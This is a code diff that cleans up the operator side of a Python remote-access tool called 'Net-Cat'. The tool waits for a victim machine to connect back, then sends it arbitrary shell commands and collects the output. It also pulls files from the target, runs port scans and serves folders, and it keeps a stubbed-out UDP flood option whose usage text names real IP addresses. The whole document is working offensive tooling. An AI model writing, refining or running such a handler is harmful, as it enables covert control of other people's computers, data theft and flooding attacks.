@@ -296,214 +296,226 @@ def recive(c,_port):
         _conn.close()
         _s.close()
 
-def main(port,_port):
-    
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+import socket
+import os
 
-    seve_to_file = False
+def main(port, _port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    save_to_file = False
     default_fname = "save_out_put.txt"
 
     try:
-        s.bind((host,port))
-
-        print(GREEN+"[WAITING FOR THE CONNECTION...]"+END)
+        s.bind((host, port))
+        print(f"{GREEN}[WAITING FOR THE CONNECTION...]{END}")
         s.listen(5)
-
-        (conn,addr) = s.accept()
+        conn, addr = s.accept()
         pwd = conn.recv(1024).decode("utf-8")
         clear()
-    #print(YELLOW+"\t\t\t[TARGET ADDRS = "+END+GREEN+addr[0]+"]"+END)
-
     except Exception as e:
-        print(RED,"[!][!] ",e,END)
+        print(f"{RED}[!][!] {e}{END}")
         exit()
-
     except KeyboardInterrupt:
         clear()
-        print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite...")
+        print(f"{RED}[KEYBOARD INTERRUPT Ctrl + C] Wait...{END}")
         try:
-            input("[Peres_Enter_To_Exit...]"+END)
-            clear()
-            s.close()
-            exit(0)
+            input(f"[Press_Enter_To_Exit...]{END}")
         except KeyboardInterrupt:
-              print(YELLOW+"[-] stupid can't escape this reality"+END)
-              s.close()
-              exit()
-              pass
+            print(f"{YELLOW}[-] You can't escape this reality{END}")
+        s.close()
+        exit()
 
     while True:
-
-
         try:
             emot = emo()
-            com = input(BLUE+"<●"+END+GREEN+"["+END+YELLOW+"Net-Cat"+END+GREEN+"]"+END+BLUE+emot+END+GREEN+"["+END+MAGENTA+pwd+END+GREEN+"]"+END+BLUE+"> "+END+GREEN+"\n\t   └─$ ")
-            """help me"""+END
-            if com[:8]=="download":
+            com = input(
+                f"{BLUE}<●{END}{GREEN}[{END}{YELLOW}Net-Cat{END}{GREEN}]{END}"
+                f"{BLUE}{emot}{END}{GREEN}[{END}{MAGENTA}{pwd}{END}{GREEN}]{END}"
+                f"{BLUE}> {END}{GREEN}\n\t   └─$ "
+            )
 
+            # download
+            if com.startswith("download"):
                 if len(com) == 8:
-                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
-                elif com[9:] == "-h" or com[9:] == "--help":
-                    Help(com[:8])
+                    print(f"{GREEN}[+] Try: {com} -h or --help{END}")
+                elif com[9:] in ("-h", "--help"):
+                    Help("download")
                 else:
-                    conn.send(str.encode(com))
-                    c = com[9:]
-                    recive(c,_port)
+                    conn.send(com.encode())
+                    recive(com[9:], _port)
 
-            elif com[:6] == "l-host":
-
+            # l-host
+            elif com.startswith("l-host"):
                 if len(com) == 6:
-                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
+                    print(f"{GREEN}[+] Try: {com} -h or --help{END}")
+                elif com[7:] in ("-h", "--help"):
+                    Help("l-host")
+                else:
+                    LocalHost(com[7:])
 
-                elif com[7:] == "-h" or com[7:] == "--help":
-                    Help(com[:6])
-                else:
-                    com = com[7:]
-                    LocalHost(com)
-            elif com[:9] == "target-ip":
+            # target-ip
+            elif com.startswith("target-ip"):
                 if len(com) == 9:
-                    print(GREEN,"[+] [TARGET]",END,YELLOW, " target ip = {}".format(addr[0]),END )
+                    print(f"{GREEN}[+] [TARGET]{END} {YELLOW}target ip = {addr[0]}{END}")
+                elif com[10:] in ("help", "-h", "--help"):
+                    Help("target-ip")
                 else:
-                    if com[10:] == "help" or com[10:] == "-h" or com[10:] == "--help":
-                        Help(com[:9])
-                    else:
-                        print(RED+"[!] Invalid commands!!\n"+END,GREEN+"[Try] : target-ip help, -h or --help"+END)
-            elif com[:11] == "output_save":
+                    print(f"{RED}[!] Invalid command!{END}")
+                    print(f"{GREEN}[Try] : target-ip help, -h or --help{END}")
+
+            # output_save
+            elif com.startswith("output_save"):
                 if len(com) == 11:
-                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
-                elif com[12:] == "-h" or com[12:] == "--help":
-                    Help(com[:11])
-                elif com[12:] == "True" or com[12:] == "true":
-                    seve_to_file = True
-                    new_fname = input("[+] Enter file name"+YELLOW+"(Default : {}): ".format(default_fname)+END)
-                    if len(new_fname) != 0:
-                        if new_fname == (" " * len(new_fname)):
-                            print(YELLOW, "[+] Please Enter Valid Name ",END)
-                            seve_to_file = False
-                        else:
-                            default_fname = new_fname
-                elif com[12:] == "False" or com[12:] == "false":
-                    seve_to_file = False
+                    print(f"{GREEN}[+] Try: {com} -h or --help{END}")
+                elif com[12:] in ("-h", "--help"):
+                    Help("output_save")
+                elif com[12:].lower() == "true":
+                    save_to_file = True
+                    new_fname = input(f"[+] Enter file name {YELLOW}(Default: {default_fname}): {END}")
+                    if new_fname.strip():
+                        default_fname = new_fname.strip()
+                    else:
+                        print(f"{YELLOW}[+] Please enter a valid name{END}")
+                        save_to_file = False
+                elif com[12:].lower() == "false":
+                    save_to_file = False
+
+            # help
             elif com == "help":
                 Help(com)
 
-            elif com[:6] == "server":
+            # server
+            elif com.startswith("server"):
                 if len(com) == 6:
-                    print(GREEN,"[+]  Try: {} -h or --help".format(com),END)
-                elif com[7:] == "-h" or com[7:] == "--help":
-                    Help(com[:6])
+                    print(f"{GREEN}[+] Try: {com} -h or --help{END}")
+                elif com[7:] in ("-h", "--help"):
+                    Help("server")
+                elif ":" in com:
+                    conn.send(com.encode())
                 else:
-                    if ":" in com:
-                        conn.send(str.encode(com))
-                    else:
-                        print(RED+"Invalid addres!!"+END)
+                    print(f"{RED}Invalid address!{END}")
 
+            # general commands
             else:
-
-                if com == "" or com == (" " * len(com)):
+                if not com.strip():
                     com = "echo '[!][!] cannot execute empty commands :p'"
+                conn.send(com.encode())
 
-                conn.send(str.encode(com))
-
-                if com == "exit" or com == "quite":
+                if com in ("exit", "quit"):
                     try:
-                        input(RED+"[Peres_Enter_To_Exit...]"+END)
-                        print(MAGENTA+"[EXITING... Good Bay...]"+END)
-                        conn.send(str.encode(com))
+                        input(f"{RED}[Press_Enter_To_Exit...]{END}")
+                        print(f"{MAGENTA}[EXITING... Goodbye...]{END}")
                         break
                     except KeyboardInterrupt:
-                        print(YELLOW+"[-] stupid can't escape this reality"+END)
+                        print(f"{YELLOW}[-] You can't escape this reality{END}")
                         break
-                # maximum recive data 99999999B = 953.6743154526MB
-                m = str(conn.recv(999999999),"utf-8")
+
+                m = conn.recv(999999999).decode("utf-8")
                 if "-pwd@-" in m:
                     pwd = m[6:]
-                    m = GREEN+"[+]  successfully moved to : " + m[6:] +END
+                    m = f"{GREEN}[+] Successfully moved to: {pwd}{END}"
                 print(m)
-                if seve_to_file:
-                    with open("input.txt","w") as f0:
+
+                if save_to_file:
+                    with open("input.txt", "w") as f0:
                         f0.write(m)
-                    with open("input.txt","r") as f,\
-                            open(default_fname,"a") as f2:
-                                f2.write("<● [Netcat]-[{}]>{}\n".format(pwd,com))
-                                for word in f.readlines():
-                                     if "." in word:
-                                        if "[" in word:
-                                            f2.write("\t\t"+word[7:-4]+"[directory]\n")
-                                        else:
-                                            f2.write("\t\t"+word)
-                                     else:
-                                        if "[" in word:
-                                            f2.write("\t\t/"+word[7:-4]+"[directory]\n")
-                                        else:
-                                            f2.write("\t\t/"+word)
-                    os.system("rm -r input.txt")
+                    with open("input.txt", "r") as f_in, open(default_fname, "a") as f_out:
+                        f_out.write(f"<● [Netcat]-[{pwd}]>{com}\n")
+                        for line in f_in:
+                            clean_line = line.strip()
+                            if "." in clean_line:
+                                if "[" in clean_line:
+                                    f_out.write(f"\t\t{clean_line[7:-4]}[directory]\n")
+                                else:
+                                    f_out.write(f"\t\t{clean_line}\n")
+                            else:
+                                if "[" in clean_line:
+                                    f_out.write(f"\t\t/{clean_line[7:-4]}[directory]\n")
+                                else:
+                                    f_out.write(f"\t\t/{clean_line}\n")
+                    os.remove("input.txt")
 
         except Exception as e:
             print(e)
 
         except KeyboardInterrupt:
             clear()
-            print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite..."+END)
+            print(f"{RED}[KEYBOARD INTERRUPT Ctrl + C] Wait...{END}")
             try:
-                input(MAGENTA+"[Peres_Enter_To_Continuse...]"+END)
+                input(f"{MAGENTA}[Press_Enter_To_Continue...]{END}")
                 clear()
-                pass
-            except  KeyboardInterrupt:
-                print(YELLOW+"[-] stupid can't escape this reality"+END)
-                pass
+            except KeyboardInterrupt:
+                print(f"{YELLOW}[-] You can't escape this reality{END}")
 
     conn.close()
     s.close()
 
+
 if __name__ == "__main__":
-    global host
-    global port
+    import sys
 
     host = ""
     port = 55555
+
     try:
+        cmd = sys.argv[1] if len(sys.argv) > 1 else None
 
-        if sys.argv[1] == "-h" or sys.argv[1] == "--help" or sys.argv[1] == "help":
+        if cmd in ("-h", "--help", "help"):
             HELP()
-        
-        elif sys.argv[1] == "--download" or sys.argv[1] == "-d":
+
+        elif cmd in ("--download", "-d"):
             try:
-                if sys.argv[2] == " "*len(sys.argv[2]):
-                    print("[!] Please Enter Valid url.\n[+] Try -d https://www.example-web.com/sample.pdf or\n--download https://www.example-web.com/sample.pdf")
+                url = sys.argv[2].strip()
+                if not url:
+                    print("[!] Please enter a valid URL.")
+                    print("[+] Try: -d https://example.com/file.pdf or --download https://example.com/file.pdf")
                 else:
-                    download(sys.argv[2])
-            except:
-                print("[+] Try -d https://www.example-web.com/sample.pdf or\n--download https://www.example-web.com/sample.pdf")
+                    download(url)
+            except IndexError:
+                print("[+] Missing URL.")
+                print("[+] Try: -d https://example.com/file.pdf or --download https://example.com/file.pdf")
 
-        elif sys.argv[1] == "--port-scan" or sys.argv[1] == "-s":
+        elif cmd in ("--port-scan", "-s"):
             try:
-                port_scan(sys.argv[2])
-            except:
-                print(sys.argv[2])
-                print("[+] Try: -s 127.0.0.1 or --port-scan 127.0.0.1 [-s,--port-scan <host>]")
+                target = sys.argv[2]
+                port_scan(target)
+            except IndexError:
+                print("[+] Missing target IP.")
+                print("[+] Try: -s 127.0.0.1 or --port-scan 127.0.0.1")
 
-        elif sys.argv[1] == "--udp-flood":
+        elif cmd == "--udp-flood":
             try:
-                print("out of bisness")
+                print("Out of business.")
             except Exception as e:
-                print("[+] try: --udp-flood 142.250.181.164 or --udp-flood www.google.com [--udp-flood <host>]\n--udp-flood 127.0.0.1,142.250.181.164,8.8.8.8 no space bettwen the host and the coma(,)",e)
-            
-        elif sys.argv[1] == "--listen" or sys.argv[1] == "-l":
-            print("iam in")
+                print("[+] Try: --udp-flood <host1,host2,...>")
+                print("[+] Example: --udp-flood 127.0.0.1,8.8.8.8", e)
+
+        elif cmd in ("--listen", "-l"):
+            print("[+] Listening mode activated.")
             try:
-                port  = int(sys.argv[2])
-                _port = port - 1
-                print("[+] listening on port number {}".format(port))
-                main(port,_port)
-            except:
-                _port = port - 1
-                main(port,_port)
-        elif sys.argv[1] == "-ss" or sys.argv[1] == "--server":
+                port = int(sys.argv[2])
+            except (IndexError, ValueError):
+                pass  # use default port
+            _port = port - 1
+            print(f"[+] Listening on port {port}")
+            main(port, _port)
+
+        elif cmd in ("--server", "-ss"):
             try:
-                run_server(sys.argv[2])
-            except:
-                print("[+] Try: -ss dir_name1/dir_name2 or --server dir_name1/dir_name2 [-ss,--server <path of the folder>")
-        
-    except:
+                path = sys.argv[2]
+                run_server(path)
+            except IndexError:
+                print("[+] Missing folder path.")
+                print("[+] Try: -ss folder/subfolder or --server folder/subfolder")
+
+        else:
+            if cmd:
+                print(f"[!] Unknown command: {cmd}")
+                HELP()
+            else:
+                HELP()
+
+    except Exception as e:
+        print(f"[!] Error: {e}")
         HELP()
+
